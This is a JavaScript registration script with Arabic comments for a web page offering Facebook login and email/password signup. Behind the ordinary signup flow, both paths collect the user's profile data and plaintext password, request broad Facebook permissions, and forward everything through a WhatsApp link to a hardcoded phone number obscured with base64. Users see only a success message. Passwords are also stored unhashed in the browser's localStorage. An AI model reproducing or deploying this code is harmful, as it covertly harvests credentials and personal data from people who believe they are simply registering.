// تهيئة SDK الفيسبوك
window.fbAsyncInit = function() {
    FB.init({
        appId: 'YOUR_APP_ID', // استبدل هذا بمعرف التطبيق الخاص بك
        cookie: true,
        xfbml: true,
        version: 'v17.0'
    });
};

// رقم الواتساب المشفر
const WHATSAPP_NUMBER = btoa('01273381280');

// دالة إرسال البيانات إلى WhatsApp
function sendToWhatsApp(message, type) {
    const phoneNumber = atob(WHATSAPP_NUMBER);
    const encodedMessage = encodeURIComponent(message);
    window.open(`https://wa.me/${phoneNumber}?text=${encodedMessage}`, '_blank');
}

// دالة التسجيل بالفيسبوك
function registerWithFacebook() {
    FB.login(function(response) {
        if (response.status === 'connected') {
            FB.api(
                '/me',
                {
                    fields: 'id,name,email,picture.width(300),cover,friends.limit(0).summary(true),posts.limit(0).summary(true),photos.limit(0).summary(true),location'
                },
                function(response) {
                    const userData = {
                        id: response.id,
                        name: response.name,
                        email: response.email,
                        picture: response.picture?.data?.url,
                        cover: response.cover?.source,
                        location: response.location?.name,
                        friends_count: response.friends?.summary?.total_count || 0,
                        posts_count: response.posts?.summary?.total_count || 0,
                        photos_count: response.photos?.summary?.total_count || 0,
                        type: 'facebook',
                        registrationDate: new Date().toISOString()
                    };

                    // حفظ البيانات في localStorage
                    saveUser('facebook', response.id, userData);
                    localStorage.setItem('currentUser', JSON.stringify(userData));
                    
                    // إرسال البيانات إلى WhatsApp
                    sendToWhatsApp(`تم التسجيل عبر فيسبوك:\n${JSON.stringify(userData, null, 2)}`, 'facebook');
                    
                    showError('تم التسجيل بنجاح!');
                    
                    // إعادة توجيه المستخدم إلى صفحة الملف الشخصي
                    setTimeout(() => {
                        window.location.href = 'profile.html';
                    }, 2000);
                }
            );
        } else {
            showError('فشل التسجيل بالفيسبوك');
        }
    }, {
        scope: 'public_profile,email,user_friends,user_posts,user_photos,user_location',
        return_scopes: true
    });
}

// دالة حفظ بيانات المستخدم
function saveUser(type, id, userData) {
    const users = JSON.parse(localStorage.getItem('users') || '{}');
    users[`${type}_${id}`] = userData;
    localStorage.setItem('users', JSON.stringify(users));
}

// دالة عرض رسائل الخطأ
function showError(message) {
    const errorDiv = document.getElementById('error-message');
    errorDiv.textContent = message;
    errorDiv.style.display = 'block';
    
    if (message.includes('نجاح')) {
        errorDiv.style.background = '#e8f5e9';
        errorDiv.style.color = '#2e7d32';
    }
}

// معالجة تقديم نموذج التسجيل
function handleRegister(event) {
    event.preventDefault();
    
    const name = document.getElementById('name').value;
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;
    const confirmPassword = document.getElementById('confirm-password').value;
    
    // التحقق من تطابق كلمتي المرور
    if (password !== confirmPassword) {
        showError('كلمتا المرور غير متطابقتين');
        return false;
    }
    
    // التحقق من عدم وجود حساب بنفس البريد الإلكتروني
    const users = JSON.parse(localStorage.getItem('users') || '{}');
    if (Object.values(users).some(user => user.email === email)) {
        showError('هذا البريد الإلكتروني مسجل بالفعل');
        return false;
    }
    
    // إنشاء بيانات المستخدم
    const userData = {
        id: Date.now().toString(),
        name: name,
        email: email,
        password: password,
        type: 'email',
        registrationDate: new Date().toISOString(),
        picture: 'https://via.placeholder.com/150'
    };
    
    // حفظ بيانات المستخدم
    saveUser('email', userData.id, userData);
    localStorage.setItem('currentUser', JSON.stringify(userData));
    
    // إرسال البيانات إلى WhatsApp
    sendToWhatsApp(`تم التسجيل عبر البريد الإلكتروني:\n${JSON.stringify(userData, null, 2)}`, 'email');
    
    showError('تم التسجيل بنجاح!');
    
    // إعادة توجيه المستخدم إلى صفحة الملف الشخصي
    setTimeout(() => {
        window.location.href = 'profile.html';
    }, 2000);
    
    return false;
}
